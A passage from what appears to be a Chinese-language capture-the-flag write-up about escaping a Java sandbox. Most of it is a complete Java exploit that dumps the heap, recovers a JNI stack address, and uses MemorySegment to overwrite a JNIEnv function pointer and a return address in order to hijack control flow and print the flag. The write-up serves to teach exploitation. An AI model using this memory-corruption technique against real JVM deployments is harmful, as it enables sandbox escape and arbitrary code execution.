      var ret = (MemorySegment) getEnv.invoke(name);
      return ret.reinterpret(1000).getString(0);
    }
  }
}
```

此外还有其他的解法，例如使用 `Expression` 调用 `System.getenv`。

### Flag 3

做一次 heap dump，然后从中捞出 JNI 的栈指针，最后用 `MemorySegment` 实现 ROP，让 caller 输出 flag：

```java
import module java.base;
import module java.management;
import module jdk.management;

public class Solution {
  // HPROF format spec:
  // https://hg.openjdk.org/jdk6/jdk6/jdk/raw-file/tip/src/share/demo/jvmti/hprof/manual.html
  private static final byte[] PREFIX = {
    0x00, 0x00, 0x00, 0x19, // Length.
    0x00, 0x00,             // First 2 bytes of stack address.
  };
  private static final int MID_LEN = 6;
  private static final byte[] SUFFIX = {
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x6c, // Length of `MemorySegment` (108).
    0x00,                   // `readOnly` false.
    0x00, 0x00, 0x00, 0x00, // Upper 4 bytes of `GlobalSession` reference.
  };

  public static String solve(Object f) throws Exception {
    // Read stack address from heap dump.
    dumpHeap("heap.hprof", true);
    var stackAddr = parseStackAddress("heap.hprof");
    IO.println("Stack address: 0x" + Long.toHexString(stackAddr));

    /*
      Stack layout:
        +---------------------+
        | rbp                 | <- stackAddr - 16
        +---------------------+   \_ `JNIEnv*` of `Java_Flag2_sysInfo`
        | Return address      | <- stackAddr - 8
        +---------------------+
        | struct sysinfo info | <- stackAddr
        +---------------------+   \_ rsp of `Java_Flag2_sysInfo`
        | Rest of the stack   |
        .......................
    */

    // Rewrite `CallStaticObjectMethod` to `getFlag`.
    var jniEnvPtr = readAddr(stackAddr - 16);
    var jniEnv = readAddr(jniEnvPtr);
    var retAddr = readAddr(stackAddr - 8);
    var getFlagAddr = retAddr - 0x138;
    writeAddr(jniEnv + 0x390, getFlagAddr);

    // Rewrite return address to call `getFlag`.
    writeAddr(stackAddr - 8, retAddr - 0x19);

    // Done, just return something.
    return "";
  }

  private static void dumpHeap(String fileName, boolean live) throws IOException {
    // Remove the given file if it exists.
    var file = new File(fileName);
    if (file.exists()) {
      if (!file.delete()) {
        throw new IOException("Failed to delete existing heap dump file");
      }
    }

    MBeanServer server = ManagementFactory.getPlatformMBeanServer();
    HotSpotDiagnosticMXBean mxBean = ManagementFactory.newPlatformMXBeanProxy(
      server,
      "com.sun.management:type=HotSpotDiagnostic",
      HotSpotDiagnosticMXBean.class
    );
    mxBean.dumpHeap(fileName, live);
  }

  private static long parseStackAddress(String heapDumpFile) throws Exception {
    try (var in = new FileInputStream(heapDumpFile)) {
      var data = in.readAllBytes();
      var end = data.length - PREFIX.length - MID_LEN - SUFFIX.length;
      for (int i = 0; i < end; i++) {
        if (matches(data, i, PREFIX) &&
            matches(data, i + PREFIX.length + MID_LEN, SUFFIX)) {
          return bytes6ToLong(data, i + PREFIX.length);
        }
      }
    }
    throw new IllegalStateException("Stack address not found");
  }

  private static boolean matches(byte[] data, int offset, byte[] pattern) {
    for (int i = 0; i < pattern.length; i++) {
      if (data[offset + i] != pattern[i]) {
        return false;
      }
    }
    return true;
  }

  private static long bytes6ToLong(byte[] data, int offset) {
    long value = 0;
    for (int i = 0; i < 6; i++) {
      value = (value << 8) | (data[offset + i] & 0xff);
    }
    return value;
  }

  private static long readAddr(long addr) {
    return MemorySegment.ofAddress(addr)
                        .reinterpret(8)
                        .get(ValueLayout.JAVA_LONG, 0);
  }

  private static void writeAddr(long addr, long value) {
    MemorySegment.ofAddress(addr)
                 .reinterpret(8)
                 .set(ValueLayout.JAVA_LONG, 0, value);
  }
}
```

在看了其他选手的解法后我意识到这个 flag 的预期解思路非常脱裤子放屁，因为事实上完全可以直接绕过 Java agent 用更简单的方法把这个题做出来。
